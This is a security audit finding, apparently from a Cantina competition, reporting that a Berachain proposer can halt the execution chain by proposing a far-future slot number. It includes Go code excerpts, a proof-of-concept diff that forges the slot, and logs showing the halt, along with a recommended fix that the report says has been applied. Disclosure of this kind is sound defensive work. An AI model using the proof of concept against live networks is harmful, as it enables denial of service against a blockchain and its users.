---
tags:
  - lang/solidity
  - sector/governance
  - sector/staking
  - platform/cantina
  - has/poc
  - severity/high
  - novelty/variant
protocol: "[[Berachain]]"
auditors:
  - "[[Haxatron]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_berachain_january2025.pdf"
genome:
  - "[[wrong-condition]]"
  - "[[variant]]"
  - "[[permanent]]"
  - "[[proposal-state-check]]"
---
# Malicious proposer can halt the execution chain by proposing a slot number far in the future

- id: 53119
- impact: HIGH
- protocol: [[Berachain]]
- reporter: Haxatron (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_berachain_january2025.pdf

## Summary

The bug report describes a vulnerability in the execution chain where a malicious proposer can halt the chain by proposing a block with a slot number far in the future. This is due to a lack of validation in the ProcessProposal function, which allows the proposer to propose a valid block with a future slot number. This can cause issues for honest proposers and lead to the execution chain halting. A proof of concept is provided, along with a recommendation to validate the slot number in ProcessProposal to prevent this vulnerability. The bug has been fixed in the latest commit.

## Details

## Context
(No context files were provided by the reviewer)

## Description
A malicious proposer can halt the execution chain by proposing a slot number far in the future. During block building, honest proposers use `req.Height` as the slot number.

```go
// prepare_proposal.go#L50
// Always reset state given that PrepareProposal can timeout
// and be called again in a subsequent round.
s.prepareProposalState = s.resetState(ctx)
s.prepareProposalState.SetContext(
    s.getContextForProposal(
        s.prepareProposalState.Context(),
        req.Height,
    ),
)
var slotData = types.NewSlotData(
    math.Slot(req.GetHeight()),
    nil,
    nil,
    req.GetProposerAddress(),
    req.GetTime(),
)
```

However, due to a lack of validation of the slot number in `ProcessProposal`, a malicious proposer can propose a valid block with a slot number far in the future. Note that the beacon specs validate this in `on_block`, before the state transition.

```python
## fork-choice.md#on_block
def on_block(store: Store, signed_block: SignedBeaconBlock) -> None:
    # ...
    # Blocks cannot be in the future. If they are, their consideration must be delayed until they are in the past.
    assert get_current_slot(store) >= block.slot
```

However, such a check is missing in `VerifyIncomingBlock`.

```go
// process_proposal.go#L193-L220
func (s *Service[
    _, _, ConsensusBlockT, _,
    _, _,
]) VerifyIncomingBlock(
    ctx context.Context,
    beaconBlk *ctypes.BeaconBlock,
    consensusTime math.U64,
    proposerAddress []byte,
) error {
    // Grab a copy of the state to verify the incoming block.
    preState := s.storageBackend.StateFromContext(ctx)

    // Force a sync of the startup head if we haven't done so already.
    // TODO: This is a super hacky. It should be handled better elsewhere,
    // ideally via some broader sync service.
    s.forceStartupSyncOnce.Do(func() {
        s.forceStartupHead(ctx, preState)
    })
    s.logger.Info(
        "Received incoming beacon block",
        "state_root", beaconBlk.GetStateRoot(), "slot", beaconBlk.GetSlot(),
    )

    // We purposefully make a copy of the BeaconState in order
    // to avoid modifying the underlying state, for the event in which
    // we have to rebuild a payload for this slot again, if we do not agree
    // with the incoming block.
    postState := preState.Copy(ctx)
    ...
}
```

Thus, the beacon block with a future slot number will get accepted, and `FinalizeBlock` will be called, storing the future slot number in the beacon state. During the next height where the honest proposer proposes, the honest proposer will fail to propose a block. During the computation of the state root, they will receive a slot mismatch (as recall, they are requesting `req.Height` as the slot number; the beacon state slot number after `processSlots` is called will be the future slot number, as slot numbers cannot progress backward), whereas the beacon block slot number will be `req.Height`.

```go
// state_processor.go#L296-L315
// processBlockHeader processes the header and ensures it matches the local state.
func (sp *StateProcessor[
    ContextT, _,
]) processBlockHeader(
    ctx ContextT,
    st *state.StateDB,
    blk *ctypes.BeaconBlock,
) error {
    // Ensure the block slot matches the state slot.
    slot, err := st.GetSlot()
    if err != nil {
        return err
    }
    if blk.GetSlot() != slot {
        return errors.Wrapf(
            ErrSlotMismatch, "expected: %d, got: %d",
            slot, blk.GetSlot(),
        )
    }
}
```

This leads the consensus client to propose an empty proposal with no transactions, causing the execution chain to halt.

## Proof of Concept
Apply the following diff using `git apply patch.diff --ignore-whitespace`. Here, at `height = 20`, a malicious proposer proposes a block with slot `120`:

```diff
diff --git a/consensus/cometbft/service/prepare_proposal.go b/consensus/cometbft/service/prepare_proposal.go
index 63a6b6281..e43bfd797 100644
--- a/consensus/cometbft/service/prepare_proposal.go
+++ b/consensus/cometbft/service/prepare_proposal.go
@@ -57,8 +57,13 @@ func (s *Service[LoggerT]) prepareProposal(
        ),
    )
    + slotNumber := req.GetHeight()
    + if req.Height == 20 {
    + slotNumber += 100
    + }
    
    var slotData = types.NewSlotData(
    - math.Slot(req.GetHeight()),
    + math.Slot(slotNumber),
        nil,
        nil,
        req.GetProposerAddress(),
```
This block will get accepted, and after `height = 20`, every time an honest proposer proposes, it will fail with a slot mismatch error. This results in an empty proposal being proposed by honest proposers, causing the execution chain to halt.

```
2025-01-15T13:52:51Z INFO Timed out module=consensus dur=1869.874449 height=63 round=0 step=RoundStepNewHeight
2025-01-15T13:52:51Z WARN Suggested fee recipient is not configured service=engine.client
fee-recipent=0x0000000000000000000000000000000000000000,
2025-01-15T13:52:51Z INFO Forkchoice updated service=execution-engine
head_block_hash=0x374bae727463b8a8dcf17e2dc522219711b9ef0579e6d698755d1b2aa35e1ef9
safe_block_hash=0xd25715695ef032557f7b9a9ce1d31bc70ae3864cd5426918768ab40c99902020
finalized_block_hash=0xd25715695ef032557f7b9a9ce1d31bc70ae3864cd5426918768ab40c99902020
with_attributes=true payload_id=0x03c0dbff27ae479c
2025-01-15T13:52:51Z INFO Waiting for local payload to be delivered to execution client
service=payload-builder for_slot=63 timeout=2.5s,
2025-01-15T13:52:53Z INFO Ensure peers module=pex numOutPeers=1 numInPeers=5 numDialing=0 numToDial=9
2025-01-15T13:52:53Z INFO We need more addresses. Sending pexRequest to random peer module=pex
peer=Peer{MConn{172.16.0.11:54772} e9f22dde88a9fa005ee96a5f935d2706080d32fb in},
2025-01-15T13:52:53Z INFO Building block body with local deposits service=validator start_index=4 num_deposits=0
2025-01-15T13:52:53Z ERRR failed to compute state root while building block service=validator slot=63
error=expected: 120, got: 63: slot mismatch,
2025-01-15T13:52:53Z ERRR failed to prepare proposal height=63 err=expected: 120, got: 63: slot mismatch
```

## Recommendation
Validate that `req.Height >= blk.Slot` in `ProcessProposal` as per beacon specs. This prevents validators from accepting beacon blocks with future slot numbers.

**Berachain:** Fixed in commit `39c4ebee`.
